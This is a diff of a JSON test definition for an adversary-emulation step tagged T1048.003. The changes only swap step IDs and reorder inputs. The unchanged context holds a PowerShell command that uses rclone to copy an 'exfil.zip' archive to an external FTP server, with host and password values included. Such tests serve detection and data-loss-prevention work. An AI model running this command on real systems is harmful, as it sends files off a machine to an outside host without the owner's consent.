@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "a08d924c-bc75-44b8-ab8c-d88e554fce6b",
+      "id": "55f8625c-3f88-43a4-a40d-6af3c50050ea",
       "type": "execute-command",
       "data": {
         "command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n\u0026$rclone_bin config create ftpserver \"ftp\" \"host\" #{ftp_server} \"port\" #{ftp_port} \"user\" #{ftp_user} \"pass\" #{ftp_pass}\n\u0026$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "111ae37b-6819-43b2-a9f4-54352448262e",
+      "id": "faf13cb7-2e3e-4016-9865-859df7079408",
       "name": "Check dependency 1/2",
       "description": "Check if the exfil package exists\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": true
     },
     {
-      "id": "d446c5e4-9c32-4aaf-90fe-fad9363060fe",
+      "id": "af47d417-4ab1-48e7-b32f-fb5e626e7123",
       "name": "Resolve dependency 1/2",
       "description": "Check if the exfil package exists\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": true
     },
     {
-      "id": "b0557f6a-5f8e-4f75-82f0-42ece1724ab4",
+      "id": "d8870370-dd0a-4bb0-bf1b-4e00c28ccfba",
       "name": "Re-check dependency 1/2",
       "description": "Check if the exfil package exists\n",
       "type": "execute-command",
@@ -49,7 +49,7 @@
       "elevation_required": true
     },
     {
-      "id": "aed1af18-60f4-4bb1-9911-f991f36663bd",
+      "id": "9ec12e3e-edbb-4094-b319-a14141d662d0",
       "name": "Check dependency 2/2",
       "description": "Check if rclone zip exists",
       "type": "execute-command",
@@ -60,7 +60,7 @@
       "elevation_required": true
     },
     {
-      "id": "70d6e74c-6f86-4612-87c1-0bcce22f63cf",
+      "id": "d5c8be6b-03aa-432e-845d-b17ace1b6f9d",
       "name": "Resolve dependency 2/2",
       "description": "Check if rclone zip exists",
       "type": "execute-command",
@@ -71,7 +71,7 @@
       "elevation_required": true
     },
     {
-      "id": "3fffb2f8-e1a0-43ee-b674-2b2a789f47d7",
+      "id": "44d1eb2d-c044-43f2-a829-677becc780f6",
       "name": "Re-check dependency 2/2",
       "description": "Check if rclone zip exists",
       "type": "execute-command",
@@ -84,44 +84,44 @@
   ],
   "flows": [
     {
-      "s": "111ae37b-6819-43b2-a9f4-54352448262e",
+      "s": "faf13cb7-2e3e-4016-9865-859df7079408",
       "p": "on-success",
-      "o": "a08d924c-bc75-44b8-ab8c-d88e554fce6b"
+      "o": "55f8625c-3f88-43a4-a40d-6af3c50050ea"
     },
     {
-      "s": "111ae37b-6819-43b2-a9f4-54352448262e",
+      "s": "faf13cb7-2e3e-4016-9865-859df7079408",
       "p": "on-failure",
-      "o": "d446c5e4-9c32-4aaf-90fe-fad9363060fe"
+      "o": "af47d417-4ab1-48e7-b32f-fb5e626e7123"
     },
     {
-      "s": "d446c5e4-9c32-4aaf-90fe-fad9363060fe",
+      "s": "af47d417-4ab1-48e7-b32f-fb5e626e7123",
       "p": "on-success",
-      "o": "b0557f6a-5f8e-4f75-82f0-42ece1724ab4"
+      "o": "d8870370-dd0a-4bb0-bf1b-4e00c28ccfba"
     },
     {
-      "s": "b0557f6a-5f8e-4f75-82f0-42ece1724ab4",
+      "s": "d8870370-dd0a-4bb0-bf1b-4e00c28ccfba",
       "p": "on-failure",
-      "o": "a08d924c-bc75-44b8-ab8c-d88e554fce6b"
+      "o": "55f8625c-3f88-43a4-a40d-6af3c50050ea"
     },
     {
-      "s": "aed1af18-60f4-4bb1-9911-f991f36663bd",
+      "s": "9ec12e3e-edbb-4094-b319-a14141d662d0",
       "p": "on-success",
-      "o": "a08d924c-bc75-44b8-ab8c-d88e554fce6b"
+      "o": "55f8625c-3f88-43a4-a40d-6af3c50050ea"
     },
     {
-      "s": "aed1af18-60f4-4bb1-9911-f991f36663bd",
+      "s": "9ec12e3e-edbb-4094-b319-a14141d662d0",
       "p": "on-failure",
-      "o": "70d6e74c-6f86-4612-87c1-0bcce22f63cf"
+      "o": "d5c8be6b-03aa-432e-845d-b17ace1b6f9d"
     },
     {
-      "s": "70d6e74c-6f86-4612-87c1-0bcce22f63cf",
+      "s": "d5c8be6b-03aa-432e-845d-b17ace1b6f9d",
       "p": "on-success",
-      "o": "3fffb2f8-e1a0-43ee-b674-2b2a789f47d7"
+      "o": "44d1eb2d-c044-43f2-a829-677becc780f6"
     },
     {
-      "s": "3fffb2f8-e1a0-43ee-b674-2b2a789f47d7",
+      "s": "44d1eb2d-c044-43f2-a829-677becc780f6",
       "p": "on-failure",
-      "o": "a08d924c-bc75-44b8-ab8c-d88e554fce6b"
+      "o": "55f8625c-3f88-43a4-a40d-6af3c50050ea"
     }
   ],
   "tags": [
@@ -129,18 +129,6 @@
     "T1048.003"
   ],
   "input_arguments": [
-    {
-      "name": "ftp_server",
-      "type": "string",
-      "description": "Your own ftp server",
-      "value": "ftp.dlptest.com"
-    },
-    {
-      "name": "ftp_pass",
-      "type": "string",
-      "description": "Your FTP user's password",
-      "value": "rNrKYTX9g7z3RgJRmxWuGHbeu"
-    },
     {
       "name": "ftp_user",
       "type": "string",
@@ -152,6 +140,18 @@
       "type": "integer",
       "description": "Your FTP's port",
       "value": "21"
+    },
+    {
+      "name": "ftp_server",
+      "type": "string",
+      "description": "Your own ftp server",
+      "value": "ftp.dlptest.com"
+    },
+    {
+      "name": "ftp_pass",
+      "type": "string",
+      "description": "Your FTP user's password",
+      "value": "rNrKYTX9g7z3RgJRmxWuGHbeu"
     }
   ]
 }
